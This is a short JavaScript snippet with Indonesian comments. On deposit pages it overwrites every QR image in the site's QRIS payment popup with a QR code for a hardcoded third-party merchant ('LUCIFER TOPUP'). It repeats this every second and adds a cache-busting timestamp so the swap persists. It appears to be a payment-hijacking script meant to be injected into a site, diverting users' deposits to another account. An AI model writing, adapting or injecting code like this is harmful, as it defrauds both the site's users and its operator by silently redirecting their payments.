(function() {
  const url = window.location.href;

  // Hanya untuk halaman deposit
  if (url.includes('/deposit')) {
    const newQR = "https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=00020101021126760024ID.CO.SPEEDCASH.MERCHANT01189360081530002142180215ID10250021421860303UKE51440014ID.CO.QRIS.WWW0215ID10254347309470303UKE5204581653033605802ID5913LUCIFER%20TOPUP6005MEDAN61052022662330509S2696179801091263632820703A0163045DEA";

    function replaceQris() {
      // Cari semua img di dalam popup deposit
      const imgs = document.querySelectorAll('#popupQris img');
      imgs.forEach(img => {
        img.src = newQR + "&t=" + new Date().getTime(); // tambah timestamp biar gak cache
      });
    }

    // Langsung eksekusi
    replaceQris();

    // Kalau popup muncul belakangan → cek tiap 1 detik
    setInterval(replaceQris, 1000);
  }
})();
